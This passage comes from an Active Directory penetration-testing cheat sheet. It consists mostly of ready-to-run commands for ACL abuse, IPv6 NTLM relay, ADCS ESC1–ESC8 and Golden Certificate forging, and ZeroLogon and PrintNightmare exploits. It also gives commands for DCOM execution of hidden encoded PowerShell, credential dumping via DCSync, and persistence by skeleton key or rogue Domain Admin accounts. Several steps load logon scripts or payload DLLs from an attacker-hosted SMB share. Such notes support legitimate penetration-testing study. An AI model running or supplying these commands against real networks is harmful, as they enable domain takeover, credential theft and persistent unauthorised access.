$cred = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred
```

```cmd
net user <TargetUser> NewPassword123! /domain
```

#### GenericAll on User Troubleshooting
> **SPN already set** - Target has existing SPN - Kerberoast directly, no need to set
> **Shadow cred fails** - No ADCS or old DC - Use Kerberoast or password reset
> **Password reset fails** - Password policy - Use complex password meeting requirements
> **pyWhisker errors** - Missing dependencies - `pip install pywhisker` with all deps

### GenericAll on Group
```bash
net rpc group addmem "Domain Admins" <User> -U "<Domain>/<User>%<Pass>" -S <DC_IP>
```

```powershell
Add-DomainGroupMember -Identity "Domain Admins" -Members <User>
```

### GenericWrite on User
> GenericWrite on a user object lets you modify attributes. You can Kerberoast them, add Shadow Credentials, or set a logon script.
> **Key difference from GenericAll:** Cannot reset password directly.
> **Attack options:** Targeted Kerberoast (quiet), Shadow Credentials (quiet), Logon Script (medium stealth).
> **Preferred order:** Targeted Kerberoast -> Shadow Credentials -> Logon Script

#### Targeted Kerberoasting with GenericWrite
```bash
bloodyAD -d <Domain> -u <User> -p <Pass> --host <DC_IP> set object <TargetUser> servicePrincipalName -v "fake/spn"
```

```bash
impacket-GetUserSPNs -request -dc-ip <DC_IP> <Domain>/<User>:<Pass> -outputfile roast.txt
```

```bash
bloodyAD -d <Domain> -u <User> -p <Pass> --host <DC_IP> set object <TargetUser> servicePrincipalName
```

```bash
hashcat -m 13100 roast.txt /usr/share/wordlists/rockyou.txt -r best64.rule
```

#### Logon Script Attack
> Set a malicious logon script. Executes when target logs in.

```bash
bloodyAD -d <Domain> -u <User> -p <Pass> --host <DC_IP> set object <TargetUser> scriptPath -v '\\<AttackerIP>\share\script.ps1'
```

```powershell
Set-DomainObject -Identity <TargetUser> -SET @{scriptpath='\\<AttackerIP>\share\script.ps1'}
```

##### Host Payload
```bash
impacket-smbserver share . -smb2support
```

##### Clear Logon Script [optional]
```powershell
Set-DomainObject -Identity <TargetUser> -Clear scriptpath
```

#### Enumerate GenericWrite Permissions
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -eq "<YourUser>" -and $_.ActiveDirectoryRights -match "GenericWrite"}
```

```bash
bloodyAD -d <Domain> -u <User> -p <Pass> --host <DC_IP> get object <TargetUser> --attr nTSecurityDescriptor --resolve-sd
```

#### What You CAN'T Do with GenericWrite
> **Reset password** - Requires GenericAll or ForceChangePassword
> **Delete object** - Requires GenericAll or DeleteChild
> **Modify DACL** - Requires WriteDacl
> **Take ownership** - Requires WriteOwner

#### GenericWrite Troubleshooting
> **insufficientAccessRights** - Don't have GenericWrite - Verify edge direction in BloodHound
> **SPN already set** - Target has existing SPN - Kerberoast directly, no need to set
> **Shadow cred fails** - No ADCS or DC < 2016 - Use Kerberoast or logon script
> **Logon script no callback** - User hasn't logged in - Wait, or try different attack

### WriteDACL - Grant GenericAll
```powershell
Add-DomainObjectAcl -TargetIdentity <TargetUser> -PrincipalIdentity <User> -Rights All
```

### WriteDACL - Grant DCSync Rights
```bash
dacledit.py -action write -rights DCSync -principal <User> -target-dn "DC=<Domain>,DC=local" <Domain>/<User>:<Pass>
impacket-secretsdump -just-dc <Domain>/<User>:<Pass>@<DC_IP>
```

### WriteOwner - Take Ownership
```powershell
Set-DomainObjectOwner -Identity <Target> -OwnerIdentity <User>
Add-DomainObjectAcl -TargetIdentity <Target> -PrincipalIdentity <User> -Rights All
```

### ForceChangePassword
```powershell
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)
```

## IPv6 Attacks
resources: [mitm6](https://github.com/dirkjanm/mitm6)

> Exploit IPv6 in Windows environments where it's enabled by default but rarely configured.
> **Attack vectors:** IPv6 DNS takeover, WPAD spoofing, LDAP relay, credential capture.

### Prerequisites
> - mitm6 for IPv6 DNS spoofing
> - ntlmrelayx for credential relay
> - LDAP signing not enforced on Domain Controller

### Install mitm6
```bash
pip3 install mitm6
```

### IPv6 DNS Takeover + LDAP Relay
> Run in separate terminals. Responds to DHCPv6 requests, sets attacker as DNS server.

```bash
sudo mitm6 -d <Domain>
```

```bash
ntlmrelayx.py -6 -t ldaps://<DC_IP> -wh fakewpad.<Domain> -l loot
```

> `-6` enables IPv6 | `-wh` hosts WPAD file | `-l` dumps to loot directory
> When a machine authenticates: credentials relayed to LDAP, domain data dumped, DA can create accounts.

### Delegate User Creation
> If relayed account has rights, ntlmrelayx can create computer account for persistence.

```bash
ntlmrelayx.py -6 -t ldaps://<DC_IP> -wh fakewpad.<Domain> --delegate-access
```

```bash
getST.py -spn cifs/<TargetHost>.<Domain> '<Domain>/<ComputerAccount$>:<Password>' -impersonate Administrator
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass <Domain>/Administrator@<TargetHost>.<Domain>
```

### Verify LDAP Signing
```bash
netexec ldap <DC_IP> -u '' -p '' -M ldap-checker
```

> If LDAP signing not enforced, attack will work.

## ADCS Attacks
resources: [Certipy GitHub](https://github.com/ly4k/Certipy)

> Active Directory Certificate Services exploitation with Certipy.
> **ESC1** Template allows SAN, low-priv users can enroll
> **ESC2** Template allows Any Purpose EKU
> **ESC3** Certificate Request Agent abuse
> **ESC4** Vulnerable template ACLs
> **ESC5** Vulnerable PKI object ACLs
> **ESC6** EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA
> **ESC7** Vulnerable CA ACLs
> **ESC8** NTLM relay to HTTP enrollment endpoint

### Setup Certipy
```bash
cd /opt/Certipy
source Certipy-venv/bin/activate
```

### Find Vulnerable Templates
```bash
certipy find -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -vulnerable
```

### Find All AD CS Info
```bash
certipy find -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP>
```

### Output as Text
> Easier to grep for specific vulnerabilities.

```bash
certipy find -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -text -stdout
```

### ESC1 - Template Misconfiguration (SAN)
> Template allows requester to specify Subject Alternative Name. Request cert as anyone.

```bash
certipy req -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -ca '<CA_Name>' -template '<Template>' -upn Administrator@<Domain>
```

### ESC4 - Template ACL Abuse
> You have write access to a template. Modify it to be vulnerable, then exploit.

#### Overwrite Template
```bash
certipy template -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -template '<Template>' -save-old
```

#### Request Cert Using Modified Template
```bash
certipy req -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -ca '<CA_Name>' -template '<Template>' -upn Administrator@<Domain>
```

#### Restore Original Template
```bash
certipy template -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -template '<Template>' -configuration <Template>.json
```

### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
> CA has flag allowing SAN in any request. Any template becomes ESC1.

#### Check if Flag is Set
> Look for EDITF_ATTRIBUTESUBJECTALTNAME2 in enumeration output.

```bash
certipy find -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -vulnerable
```

#### Exploit Using Any Enrollable Template
```bash
certipy req -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -ca '<CA_Name>' -template User -upn Administrator@<Domain>
```

### ESC7 - Vulnerable CA ACLs
> You have ManageCA or ManageCertificates rights on the CA itself.

#### Add Yourself as Officer
> Requires ManageCA permission.

```bash
certipy ca -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -ca '<CA_Name>' -add-officer '<User>'
```

#### Enable SubCA Template
```bash
certipy ca -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -ca '<CA_Name>' -enable-template SubCA
```

#### Request Cert
> Will fail but saves request ID for later.

```bash
certipy req -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -ca '<CA_Name>' -template SubCA -upn Administrator@<Domain>
```

#### Issue the Failed Request
> Requires ManageCertificates or officer permission.

```bash
certipy ca -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -ca '<CA_Name>' -issue-request <RequestID>
```

#### Retrieve the Issued Cert
```bash
certipy req -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -ca '<CA_Name>' -retrieve <RequestID>
```

### ESC8 - NTLM Relay to AD CS
> HTTP enrollment endpoint with NTLM auth enabled. Relay machine account.

#### Start Relay
```bash
certipy relay -ca <CA_IP> -template DomainController
```

#### Coerce Authentication
> Run from separate terminal.

```bash
petitpotam.py <AttackerIP> <DC_IP>
```

```bash
printerbug.py <Domain>/<User>:<Password>@<DC_IP> <AttackerIP>
```

### Authenticate with Certificate
> Use PKINIT to get NT hash from certificate.

```bash
certipy auth -pfx <Cert>.pfx -dc-ip <DC_IP>
```

### LDAP Shell from Certificate [alternate]
> Use if PKINIT not supported.

```bash
certipy auth -pfx <Cert>.pfx -dc-ip <DC_IP> -ldap-shell
```

### Shadow Credentials Attack
> Write to msDS-KeyCredentialLink. Authenticate as target.

```bash
certipy shadow auto -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -account '<TargetUser>'
```

### Golden Certificate Attack
> CA private key compromised. Forge certs for anyone forever.

#### Backup CA Cert and Key
> Requires CA admin privileges.

```bash
certipy ca -u '<Admin>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -ca '<CA_Name>' -backup
```

#### Forge Certificate
```bash
certipy forge -ca-pfx <CA>.pfx -upn Administrator@<Domain> -subject "CN=Administrator,CN=Users,DC=<Domain>,DC=<TLD>"
```

#### Authenticate with Forged Cert
```bash
certipy auth -pfx administrator_forged.pfx -dc-ip <DC_IP>
```

### Certipy Useful Flags [optional]
> **-hashes :<NTHash>** Pass-the-hash instead of password
> **-pfx <File>** Use certificate for auth
> **-ns <IP>** Custom nameserver
> **-dns-tcp** Use TCP for DNS
> **-timeout 10** Connection timeout

## CVE Exploits

### CVE-2020-1472 (ZeroLogon)
> Critical Netlogon vulnerability. Resets DC machine account password to empty. Allows full domain takeover.
> **Patched:** August 2020

```bash
python3 zerologon_tester.py <DC_Name> <DC_IP>
python3 cve-2020-1472-exploit.py <DC_Name> <DC_IP>
```

```bash
secretsdump.py <Domain>/<DC_Name>\$@<DC_IP> -hashes aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee -just-dc-ntlm
```

> NT hash for empty password: aad3b435b51404eeaad3b435b51404ee
> **Important:** Restore original DC password after exploitation to avoid breaking domain.

### CVE-2021-1675 / CVE-2021-34527 (PrintNightmare)
> Print Spooler RCE vulnerability. Achieves SYSTEM via malicious printer driver DLL.
> **Patched:** Mid-2021
> **Requires:** Target running Print Spooler, valid domain creds, attacker SMB share with malicious DLL.

```bash
python3 CVE-2021-1675.py <Domain>/<User>:<Password>@<TargetIP> '\\<AttackerIP>\share\payload.dll'
```

> Use msfvenom or custom DLL for reverse shell payload.

## Lateral Movement

### DCOM Lateral Movement
> Use DCOM objects for remote code execution. Requires admin privileges and DCOM access.

```powershell
$TargetIP = "<TargetIP>"
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1", $TargetIP))

if ($dcom) {
    Write-Host "[+] DCOM object created successfully!"
    $dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c <Command>", "7")
}
```

### Execute Encoded PowerShell via DCOM
```powershell
$EncodedPayload = "<Base64EncodedCommand>"
$dcom.Document.ActiveView.ExecuteShellCommand("powershell", $null, "powershell -nop -w hidden -e $EncodedPayload", "7")
```

## Persistence

### Add Domain User
> Requires Domain Admin privileges.

```cmd
net user <NewUsername> <Password> /add /domain
net group "Domain Admins" <Username> /add /domain
net group "<GroupName>" <Username> /add /domain
```

### Skeleton Key
```
misc::skeleton
```

> Inject into LSASS on DC. All users can auth with password "mimikatz".

### DSRM Persistence
```cmd
ntdsutil "set dsrm password" "reset password on server null" q q
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2
```

## BloodHound Cypher Queries

> Mark owned users first, then run path queries. **Priority:** Quick wins first (Kerberoast/AS-REP), then ACL abuse, then delegation.

### Quick Wins
```cypher
MATCH p=shortestPath((u:User {name:'<USER>@<DOMAIN>'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'})) RETURN p
```

```cypher
MATCH p=shortestPath((o {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'})) RETURN p
```

```cypher
MATCH (u:User {hasspn:true}) MATCH (g:Group) WHERE g.objectid ENDS WITH '-512' MATCH p=shortestPath((u)-[*1..]->(g)) RETURN p
```

```cypher
MATCH (u:User {dontreqpreauth:true}) RETURN u.name
```

```cypher
MATCH (u:User) WHERE u.description CONTAINS "pass" OR u.description CONTAINS "pwd" RETURN u.name, u.description
```

> Kerberoastable users with path to DA are highest priority targets.

### ACL Abuse Queries
```cypher
MATCH p=(n)-[:GenericAll|WriteDacl|WriteOwner|ForceChangePassword]->(u:User) RETURN p
```

```cypher
MATCH p=(n)-[:GenericWrite]->(u:User) RETURN p
```

```cypher
MATCH (n)-[:AddMember]->(g:Group) WHERE g.objectid ENDS WITH '-512' OR g.objectid ENDS WITH '-519' RETURN n.name
```

```cypher
MATCH p=(g:Group {name:'DOMAIN USERS@<DOMAIN>'})-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|AddMember|ForceChangePassword]->(n) RETURN p
```

```cypher
MATCH (n)-[r:GenericAll]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'}) RETURN n.name
```

> GenericWrite on user = set SPN for targeted Kerberoast.

### DCSync and Delegation Queries
```cypher
MATCH p=(n)-[:DCSync]->(d:Domain) RETURN p
```

```cypher
MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT (c)-[:MemberOf]->(:Group {name:'DOMAIN CONTROLLERS@<DOMAIN>'}) RETURN c.name
```

```cypher
MATCH (u:User) WHERE u.allowedtodelegate IS NOT NULL RETURN u.name, u.allowedtodelegate
```

```cypher
MATCH p=(n)-[:GenericWrite|GenericAll|Owns|WriteDacl|WriteOwner|AddAllowedToAct]->(c:Computer) RETURN p
```

> RBCD: Any of these permissions on computer enables attack.

### Lateral Movement Queries
```cypher
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'}) MATCH (c:Computer)-[:HasSession]->(u) RETURN c.name, u.name
```

```cypher
MATCH p=(n)-[:ReadLAPSPassword]->(c:Computer) RETURN p
```

```cypher
MATCH (u:User {name:'<USER>@<DOMAIN>'})-[:AdminTo]->(c:Computer) RETURN c.name
```

```cypher
MATCH (g:Group {name:'DOMAIN USERS@<DOMAIN>'})-[:AdminTo]->(c:Computer) RETURN c.name
```

```cypher
MATCH (u:User {name:'<USER>@<DOMAIN>'})-[:CanRDP|CanPSRemote]->(c:Computer) RETURN c.name
```

### Additional Useful Queries
```cypher
MATCH (u:User {hasspn:true}) RETURN u.name,u.description,u.pwdlastset
```

```cypher
MATCH (n1)-[r:GetChanges]->(n2) RETURN n1.name
```

```cypher
MATCH p=(g:Group)-[:MemberOf*1..]->(da:Group {name:'DOMAIN ADMINS@<DOMAIN>'}) RETURN p
```

```cypher
MATCH (n {highvalue:true}) RETURN n.name, labels(n)
```

```cypher
MATCH p=shortestPath((u:User {name:'<USER>@<DOMAIN>'})-[*1..]->(h {highvalue:true})) RETURN p
```

```cypher
MATCH p=(o {owned:true})-[r]->(n) RETURN p
```

```cypher
MATCH (g:Group)-[:Enroll|AutoEnroll]->(ct:CertTemplate)-[:EnabledBy]->(ca:EnterpriseCA) WHERE ct.enrolleesuppliessubject = true AND ct.authenticationenabled = true RETURN ct.name, g.name
```

## Attack Chains

> **Spray to Shell:** Password spray -> valid creds -> WinRM/SMB shell
> **Kerberoast:** Valid user -> request TGS -> crack hash -> service account access
> **AS-REP Roast:** User list -> find no-preauth users -> crack -> domain access
> **AS-REP Roast Chain:** Enumerate users -> GetNPUsers -> crack hash -> WinRM/SMB shell
> **Kerberoast Chain:** Enumerate SPNs -> extract TGS -> crack service password -> lateral movement or DA
> **Kerbrute + Spray:** Username enum -> password spray -> valid creds -> shell
> **Lateral Movement:** Dump creds -> PtH/PtT -> move to next target -> repeat
> **ACL Abuse to DCSync:** BloodHound finds GenericAll on user with DCSync rights -> reset password -> DCSync
> **Delegation to DA:** Find constrained delegation -> compromise service account -> impersonate Administrator
> **Unconstrained Delegation:** Compromise machine -> coerce DC auth -> capture TGT -> DCSync
> **Constrained Delegation:** Control delegating account -> S4U2Self/Proxy -> impersonate admin -> access target
> **RBCD:** Write access to computer -> create machine account -> configure delegation -> impersonate admin

## Post-Compromise Strategy

> **1. Situational Awareness:** `whoami /all`, `systeminfo`, `ipconfig /all`
> **2. Local Privilege Escalation:** Check services, permissions, known exploits
> **3. Credential Gathering:** LSASS dump, SAM dump, browser creds, cmdkey, config files
> **4. Internal Reconnaissance:** PowerView, ldapdomaindump, BloodHound collection
> **5. Analyze Attack Paths:** BloodHound queries, ACL abuse opportunities
> **6. Lateral Movement:** Pass-the-Hash, Pass-the-Ticket, psexec, WinRM
> **7. Domain Privilege Escalation:** Kerberoast, DCSync, delegation attacks
> **8. Persistence:** Add DA user, Golden Ticket, scheduled tasks

## BloodHound Finding to Exploitation

> **Kerberoastable user:** `GetUserSPNs.py` -> `hashcat -m 13100`
> **AS-REP roastable:** `GetNPUsers.py` -> `hashcat -m 18200`
> **GenericAll on user:** `Set-DomainUserPassword` or set SPN -> Kerberoast
> **GenericWrite on user:** Set SPN -> targeted Kerberoast
> **DCSync rights:** `secretsdump.py -just-dc`
> **LAPS read:** `netexec ldap --laps`
> **AdminTo computer:** `psexec.py` -> `mimikatz`
> **DA session on computer:** Compromise computer -> dump LSASS
> **Unconstrained delegation:** SpoolSample/PetitPotam -> capture TGT
> **Constrained delegation:** `Rubeus s4u` or `getST.py` with hash
> **RBCD-writable computer:** `impacket-rbcd` -> `getST.py`
> **AddMember to DA:** Add yourself directly to Domain Admins

## Impacket Tools Reference

> **GetNPUsers** AS-REP Roasting | **GetUserSPNs** Kerberoasting
> **secretsdump** Credential dumping | **psexec/wmiexec/smbexec** Remote execution
> **getTGT** Get TGT with hash | **getST** Get service ticket for impersonation
> **ticketer** Create golden/silver tickets | **addcomputer** Add computer account
> **rbcd** RBCD attack | **lookupsid** SID enumeration
> **GetADUsers** Enumerate domain users via LDAP

## Hash Cracking Modes

> **NTLM** hashcat -m 1000 | **NTLMv2** hashcat -m 5600
> **Kerberoast RC4** hashcat -m 13100 | **Kerberoast AES** hashcat -m 19700
> **AS-REP Roast** hashcat -m 18200 | **NetNTLMv1** hashcat -m 5500

## Kerberos Error Reference

> **KDC_ERR_PREAUTH_REQUIRED** - User exists, pre-auth needed (valid username)
> **KDC_ERR_C_PRINCIPAL_UNKNOWN** - User doesn't exist
> **KDC_ERR_PREAUTH_FAILED** - Wrong password
> **KDC_ERR_CLIENT_REVOKED** - Account disabled/locked
> **Clock skew too great** - Time sync issue, run `ntpdate <DC_IP>`
> **Server not found in Kerberos database** - DNS issue, add to `/etc/hosts`
